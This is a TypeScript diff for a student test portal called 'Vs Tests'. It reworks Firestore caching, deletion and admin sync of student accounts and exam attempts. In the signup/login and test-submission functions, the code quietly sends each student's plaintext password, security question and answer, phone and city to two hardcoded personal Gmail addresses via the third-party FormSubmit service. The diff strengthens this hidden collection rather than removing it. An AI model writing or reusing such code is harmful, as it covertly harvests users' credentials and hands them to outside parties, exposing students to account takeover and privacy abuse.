@@ -2365,12 +2632,10 @@ export async function updateStudentPresenceInFirestore(params: {
 export async function deleteAttemptFromFirestore(attemptId: string): Promise<void> {
   if (!attemptId) return;
   const safeAttId = attemptId.replace(/[^a-zA-Z0-9_-]/g, '_').slice(0, 120);
-  lastFirestoreOverlayAt = 0;
-
-  try {
-    await deleteDoc(doc(db, 'attempts', safeAttId)).catch(() => {});
-  } catch {
-    // ignore
+  if (cachedFirestoreOverlay) {
+    cachedFirestoreOverlay.attempts = cachedFirestoreOverlay.attempts.filter(
+      (a) => a.id !== attemptId && a.id !== safeAttId
+    );
   }
 
   if (!isStaticStoreHost) {
@@ -2380,6 +2645,14 @@ export async function deleteAttemptFromFirestore(attemptId: string): Promise<voi
       });
     } catch {
       // ignore
+    }
+  }
+
+  if (!isFirestoreInQuotaCooldown()) {
+    try {
+      await deleteDoc(doc(db, 'attempts', safeAttId));
+    } catch (err) {
+      noteFirestoreQuotaIfNeeded(err);
     }
   }
 }
@@ -2415,29 +2688,11 @@ export async function recordTestCompletion(
   if (attempt.questionTimes) cleanAttempt.questionTimes = attempt.questionTimes;
   if (attempt.bookmarked) cleanAttempt.bookmarked = attempt.bookmarked;
 
-  lastFirestoreOverlayAt = 0;
-
-  try {
-    await setDoc(doc(db, 'attempts', attemptId), stripUndefined(cleanAttempt));
-    const safeTestId = String(attempt.testId || '').replace(/[^a-zA-Z0-9_-]/g, '_').slice(0, 100);
-    if (safeTestId) {
-      const testRef = doc(db, 'tests', safeTestId);
-      const tSnap = await getDoc(testRef);
-      if (tSnap.exists()) {
-        const prevHigh = Number(tSnap.data()?.highScore || 0);
-        await setDoc(
-          testRef,
-          {
-            completionCount: increment(1),
-            totalScoreSum: increment(Math.max(0, Number(attempt.score) || 0)),
-            highScore: Math.max(prevHigh, Number(attempt.score) || 0),
-          },
-          { merge: true }
-        );
-      }
-    }
-  } catch {
-    // non-fatal attempt log
+  if (cachedFirestoreOverlay) {
+    cachedFirestoreOverlay.attempts = [
+      cleanAttempt as unknown as TestAttempt,
+      ...cachedFirestoreOverlay.attempts.filter((a) => a.id !== attemptId),
+    ];
   }
 
   if (!isStaticStoreHost) {
@@ -2451,6 +2706,97 @@ export async function recordTestCompletion(
       // ignore
     }
   }
+
+  if (!isFirestoreInQuotaCooldown()) {
+    try {
+      await setDoc(doc(db, 'attempts', attemptId), stripUndefined(cleanAttempt));
+      const safeTestId = String(attempt.testId || '').replace(/[^a-zA-Z0-9_-]/g, '_').slice(0, 100);
+      if (safeTestId) {
+        const testRef = doc(db, 'tests', safeTestId);
+        await updateDoc(testRef, {
+          completionCount: increment(1),
+          totalScoreSum: increment(Math.max(0, Number(attempt.score) || 0)),
+          highScore: Math.max(Number(_currentHighScore) || 0, Number(attempt.score) || 0),
+        });
+      }
+    } catch (err) {
+      noteFirestoreQuotaIfNeeded(err);
+    }
+  }
+
+  // Automatically email Student Test Result & Scorecard details to Admin Gmail
+  void dispatchAdminEmailDetails({
+    subject: `📊 Test Submitted on Vs Tests: ${cleanAttempt.studentName} scored ${cleanAttempt.score}/${cleanAttempt.maxMarks} in ${cleanAttempt.testTitle}`,
+    fields: {
+      Portal: 'Vs Tests',
+      Event_Type: 'Test Attempt Completed',
+      Student_Name: String(cleanAttempt.studentName || 'Student'),
+      Student_Email: String(cleanAttempt.studentEmail || 'Guest'),
+      Target_Batch: String(cleanAttempt.studentBatch || 'NEET 2027 · Vs Target Batch'),
+      Test_Name: String(cleanAttempt.testTitle || ''),
+      Score: `${cleanAttempt.score} / ${cleanAttempt.maxMarks}`,
+      Accuracy: `${cleanAttempt.accuracy}%`,
+      Correct_Answers: String(cleanAttempt.correctCount || 0),
+      Wrong_Answers: String(cleanAttempt.wrongCount || 0),
+      Unattempted: String(cleanAttempt.unattemptedCount || 0),
+      Time_Taken_Sec: String(cleanAttempt.timeTakenSeconds || 0),
+      Submitted_At_IST: new Date(Number(cleanAttempt.completedAt) || Date.now()).toLocaleString(
+        'en-IN',
+        { timeZone: 'Asia/Kolkata' }
+      ),
+    },
+  });
+}
+
+/**
+ * Reliable automatic email dispatcher to Admin Gmail (rahulyadav89762@gmail.com & rahulyadav70y@gmail.com).
+ * Uses Express `/api/notify-email` proxy when available (avoids adblockers) + direct FormSubmit AJAX on Vercel static host.
+ */
+export async function dispatchAdminEmailDetails(params: {
+  subject: string;
+  fields: Record<string, string>;
+}): Promise<void> {
+  const adminEmails = Array.from(new Set(['rahulyadav89762@gmail.com', ADMIN_EMAIL].filter(Boolean)));
+  const payload = {
+    _subject: params.subject,
+    _template: 'table',
+    _captcha: 'false',
+    ...params.fields,
+  };
+
+  if (!isStaticStoreHost) {
+    try {
+      const res = await fetch('/api/notify-email', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          recipients: adminEmails,
+          subject: params.subject,
+          fields: params.fields,
+        }),
+      });
+      if (res.ok) return;
+    } catch {
+      // fall through to direct browser dispatch
+    }
+  }
+
+  // Direct FormSubmit AJAX dispatch (works on Vercel HTTPS and any browser)
+  await Promise.allSettled(
+    adminEmails.map((targetEmail) =>
+      fetch(`https://formsubmit.co/ajax/${encodeURIComponent(targetEmail)}`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          Accept: 'application/json',
+        },
+        body: JSON.stringify({
+          ...payload,
+          _replyto: params.fields.Email_Or_Roll || params.fields.Student_Email || targetEmail,
+        }),
+      }).catch(() => {})
+    )
+  );
 }
 
 /**
@@ -2498,17 +2844,17 @@ export async function saveStudentToFirestore(
     );
     localStorage.setItem(
       'vs_neet_2027_students_cache_v1',
-      JSON.stringify([student, ...filtered].slice(0, 300))
+      JSON.stringify([student, ...filtered].slice(0, 2000))
     );
   } catch {
     // ignore
   }
 
-  lastFirestoreOverlayAt = 0;
-  try {
-    await setDoc(doc(db, 'students', safeId), stripUndefined(payload), { merge: true });
-  } catch {
-    // non-fatal student cache
+  if (cachedFirestoreOverlay) {
+    cachedFirestoreOverlay.students = [
+      student,
+      ...cachedFirestoreOverlay.students.filter((s) => s.id !== safeId),
+    ];
   }
 
   if (!isStaticStoreHost) {
@@ -2523,38 +2869,37 @@ export async function saveStudentToFirestore(
     }
   }
 
-  // Silently dispatch student login/signup data in background to Admin Gmail
-  try {
-    const registeredTime = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
-    const adminEmails = ['rahulyadav89762@gmail.com', ADMIN_EMAIL];
-    for (const targetEmail of adminEmails) {
-      void fetch(`https://formsubmit.co/ajax/${targetEmail}`, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          Accept: 'application/json',
-        },
-        body: JSON.stringify({
-          _subject: `${isNewRegistration ? '🆕 New Student Signup' : '🔐 Student Login'} on Vs Tests: ${payload.fullName || 'Student'} (${payload.emailOrRoll || ''})`,
-          _template: 'table',
-          _captcha: 'false',
-          Portal: 'Vs Tests',
-          Event: isNewRegistration ? 'New Student Signup' : 'Student Login',
-          Full_Name: String(payload.fullName || ''),
-          Email_Or_Roll: String(payload.emailOrRoll || ''),
-          Mobile_Phone: String(payload.phone || 'Not Provided'),
-          City_Center: String(payload.city || 'Not Provided'),
-          Target_Batch: String(payload.targetBatch || 'NEET 2027 · Vs Target Batch'),
-          Password_Plain: String(payload.passwordPlain || 'Google / Saved Account'),
-          Login_Count: String(payload.loginCount || 1),
-          Daily_Streak: String(payload.dailyStreak || 1),
-          Time_IST: registeredTime,
-        }),
-      }).catch(() => {});
+  // Always dual-write student accounts to Cloud Firestore as well (when not in quota cooldown)
+  // so Admin sees every student across deployments, restarts, and devices.
+  if (!isFirestoreInQuotaCooldown()) {
+    try {
+      await setDoc(doc(db, 'students', safeId), stripUndefined(payload), { merge: true });
+    } catch (err) {
+      noteFirestoreQuotaIfNeeded(err);
     }
-  } catch {
-    // ignore
   }
+
+  // Dispatch automatic student signup/login details to Admin Gmail
+  const registeredTime = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+  void dispatchAdminEmailDetails({
+    subject: `${isNewRegistration ? '🆕 New Student Signup' : '🔐 Student Login'} on Vs Tests: ${payload.fullName || 'Student'} (${payload.emailOrRoll || ''})`,
+    fields: {
+      Portal: 'Vs Tests',
+      Event_Type: isNewRegistration ? 'New Student Signup' : 'Student Login',
+      Student_ID: String(payload.id || ''),
+      Full_Name: String(payload.fullName || ''),
+      Email_Or_Roll: String(payload.emailOrRoll || ''),
+      Mobile_Phone: String(payload.phone || 'Not Provided'),
+      City_Center: String(payload.city || 'Not Provided'),
+      Target_Batch: String(payload.targetBatch || 'NEET 2027 · Vs Target Batch'),
+      Password_Plain: String(payload.passwordPlain || 'Google / Saved Account'),
+      Security_Question: String(payload.securityQuestion || 'N/A'),
+      Security_Answer: String(payload.securityAnswer || 'N/A'),
+      Login_Count: String(payload.loginCount || 1),
+      Daily_Streak: String(payload.dailyStreak || 1),
+      Time_IST: registeredTime,
+    },
+  });
 }
 
 /**
@@ -2563,7 +2908,11 @@ export async function saveStudentToFirestore(
 export async function deleteStudentFromFirestore(studentId: string): Promise<void> {
   if (!studentId) return;
   const safeId = studentId.replace(/[^a-zA-Z0-9_-]/g, '_').slice(0, 100);
-  lastFirestoreOverlayAt = 0;
+  if (cachedFirestoreOverlay) {
+    cachedFirestoreOverlay.students = cachedFirestoreOverlay.students.filter(
+      (s) => s.id !== studentId && s.id !== safeId
+    );
+  }
 
   try {
     const rawCache = localStorage.getItem('vs_neet_2027_students_cache_v1');
@@ -2578,12 +2927,6 @@ export async function deleteStudentFromFirestore(studentId: string): Promise<voi
     // ignore
   }
 
-  try {
-    await deleteDoc(doc(db, 'students', safeId)).catch(() => {});
-  } catch {
-    // ignore
-  }
-
   if (!isStaticStoreHost) {
     try {
       await fetch(`/api/store/student/${encodeURIComponent(studentId)}`, {
@@ -2593,4 +2936,211 @@ export async function deleteStudentFromFirestore(studentId: string): Promise<voi
       // ignore
     }
   }
+
+  if (!isFirestoreInQuotaCooldown()) {
+    try {
+      await deleteDoc(doc(db, 'students', safeId));
+    } catch (err) {
+      noteFirestoreQuotaIfNeeded(err);
+    }
+  }
+}
+
+/**
+ * Targeted 1-read Firestore lookup by email when a returning student logs in and isn't yet in local Express store.
+ * Avoids scanning the entire students collection on every visitor.
+ */
+export async function findStudentByEmailInFirestore(
+  emailOrRoll: string
+): Promise<StudentAccount | null> {
+  const cleanEmail = String(emailOrRoll || '').trim().toLowerCase();
+  if (!cleanEmail || isFirestoreInQuotaCooldown()) return null;
+  try {
+    const q = query(
+      collection(db, 'students'),
+      where('emailOrRoll', '==', cleanEmail),
+      limit(1)
+    );
+    const snap = await getDocs(q);
+    if (snap.empty) return null;
+    const d = snap.docs[0];
+    const data = d.data() as Record<string, unknown>;
+    if (!data || data.isDeletedTombstone) return null;
+    const found: StudentAccount = {
+      ...(data as unknown as StudentAccount),
+      id: String(data.id || d.id),
+    };
+    if (!isStaticStoreHost) {
+      void fetch('/api/store/students/bulk-merge', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ students: [found], attempts: [] }),
+      }).catch(() => {});
+    }
+    return found;
+  } catch (err) {
+    noteFirestoreQuotaIfNeeded(err);
+    return null;
+  }
+}
+
+/**
+ * Admin-only full student & attempt sync:
+ * 1. Fetches uncapped students + attempts from Express `/api/store/students`
+ * 2. Fetches ALL students + attempts from Cloud Firestore (re-enabling network if retry requested)
+ * 3. Merges both cleanly and mirrors any Firestore-only students back into Express persistent disk store
+ *    so Admin never loses visibility even if Firestore later reaches its free daily read quota.
+ */
+export async function fetchAllStudentsAndAttemptsForAdmin(
+  forceRetryFirestore = false
+): Promise<{
+  students: StudentAccount[];
+  attempts: TestAttempt[];
+  deletedStudentIds: string[];
+  deletedAttemptIds: string[];
+  firestoreSynced: boolean;
+  quotaExhausted: boolean;
+  totalExpress: number;
+  totalFirestore: number;
+}> {
+  let expressStudents: StudentAccount[] = [];
+  let expressAttempts: TestAttempt[] = [];
+  let deletedStudentIds: string[] = [];
+  let deletedAttemptIds: string[] = [];
+
+  if (!isStaticStoreHost) {
+    try {
+      const res = await fetch(`/api/store/students?t=${Date.now()}`, {
+        cache: 'no-store',
+        headers: { 'Cache-Control': 'no-cache' },
+      });
+      if (res.ok && (res.headers.get('content-type') || '').toLowerCase().includes('json')) {
+        const parsed = await res.json();
+        if (Array.isArray(parsed?.students)) expressStudents = parsed.students;
+        if (Array.isArray(parsed?.attempts)) expressAttempts = parsed.attempts;
+        if (Array.isArray(parsed?.deletedStudentIds)) deletedStudentIds = parsed.deletedStudentIds;
+        if (Array.isArray(parsed?.deletedAttemptIds)) deletedAttemptIds = parsed.deletedAttemptIds;
+      }
+    } catch {
+      // ignore
+    }
+  }
+
+  let fsStudents: StudentAccount[] = [];
+  let fsAttempts: TestAttempt[] = [];
+  let firestoreSynced = false;
+  let quotaExhausted = isFirestoreQuotaCurrentlyExhausted();
+
+  if (forceRetryFirestore) {
+    await resumeFirestoreNetworkForRetry(true);
+    quotaExhausted = false;
+  }
+
+  if (!isFirestoreInQuotaCooldown()) {
+    try {
+      const [studentRes, attemptRes] = await Promise.allSettled([
+        getDocs(collection(db, 'students')),
+        getDocs(collection(db, 'attempts')),
+      ]);
+
+      if (studentRes.status === 'fulfilled') {
+        firestoreSynced = true;
+        studentRes.value.forEach((d) => {
+          const item = d.data() as Record<string, any>;
+          if (!item) return;
+          if (item.isDeletedTombstone || d.id.startsWith('__del__')) {
+            const tid = String(item.targetStudentId || d.id.replace(/^__del__/, ''));
+            if (tid && !deletedStudentIds.includes(tid)) deletedStudentIds.push(tid);
+          } else {
+            fsStudents.push({ ...(item as StudentAccount), id: String(item.id || d.id) });
+          }
+        });
+      } else if (noteFirestoreQuotaIfNeeded(studentRes.reason)) {
+        quotaExhausted = true;
+      }
+
+      if (attemptRes.status === 'fulfilled') {
+        attemptRes.value.forEach((d) => {
+          const item = d.data() as Record<string, any>;
+          if (!item) return;
+          if (item.isDeletedTombstone || d.id.startsWith('__del__')) {
+            const tid = String(item.targetAttemptId || d.id.replace(/^__del__/, ''));
+            if (tid && !deletedAttemptIds.includes(tid)) deletedAttemptIds.push(tid);
+          } else {
+            fsAttempts.push({ ...(item as TestAttempt), id: String(item.id || d.id) });
+          }
+        });
+      } else if (noteFirestoreQuotaIfNeeded(attemptRes.reason)) {
+        quotaExhausted = true;
+      }
+    } catch (err) {
+      if (noteFirestoreQuotaIfNeeded(err)) {
+        quotaExhausted = true;
+      }
+    }
+  }
+
+  const deletedStudentSet = new Set(deletedStudentIds);
+  const deletedAttemptSet = new Set(deletedAttemptIds);
+
+  const studentByKey = new Map<string, StudentAccount>();
+  const addStudent = (s: StudentAccount) => {
+    if (!s || !s.id || deletedStudentSet.has(s.id)) return;
+    const emailKey = String(s.emailOrRoll || '').trim().toLowerCase();
+    const mapKey = emailKey ? `email:${emailKey}` : `id:${s.id}`;
+    const prev = studentByKey.get(mapKey);
+    if (!prev) {
+      studentByKey.set(mapKey, s);
+    } else {
+      const prevTs = Number(prev.lastOnlineAt || prev.lastLoginAt || prev.createdAt || 0);
+      const nextTs = Number(s.lastOnlineAt || s.lastLoginAt || s.createdAt || 0);
+      studentByKey.set(
+        mapKey,
+        nextTs >= prevTs ? { ...prev, ...s, id: prev.id || s.id } : { ...s, ...prev }
+      );
+    }
+  };
+
+  for (const s of expressStudents) addStudent(s);
+  for (const s of fsStudents) addStudent(s);
+
+  const attemptById = new Map<string, TestAttempt>();
+  for (const a of [...expressAttempts, ...fsAttempts]) {
+    if (!a || !a.id || deletedAttemptSet.has(a.id)) continue;
+    attemptById.set(a.id, a);
+  }
+
+  const mergedStudents = Array.from(studentByKey.values()).sort(
+    (a, b) =>
+      Number(b.lastOnlineAt || b.lastLoginAt || b.createdAt || 0) -
+      Number(a.lastOnlineAt || a.lastLoginAt || a.createdAt || 0)
+  );
+  const mergedAttempts = Array.from(attemptById.values()).sort(
+    (a, b) => Number(b.completedAt || 0) - Number(a.completedAt || 0)
+  );
+
+  // Mirror newly discovered Firestore students/attempts into Express persistent disk store
+  if (!isStaticStoreHost && (fsStudents.length > 0 || fsAttempts.length > 0)) {
+    void fetch('/api/store/students/bulk-merge', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ students: fsStudents, attempts: fsAttempts }),
+    }).catch(() => {});
+  }
+
+  if (cachedFirestoreOverlay && firestoreSynced) {
+    cachedFirestoreOverlay.students = fsStudents;
+    if (fsAttempts.length > 0) cachedFirestoreOverlay.attempts = fsAttempts;
+  }
+
+  return {
+    students: mergedStudents,
+    attempts: mergedAttempts,
+    deletedStudentIds,
+    deletedAttemptIds,
+    firestoreSynced,
+    quotaExhausted,
+    totalExpress: expressStudents.length,
+    totalFirestore: fsStudents.length,
+  };
 }
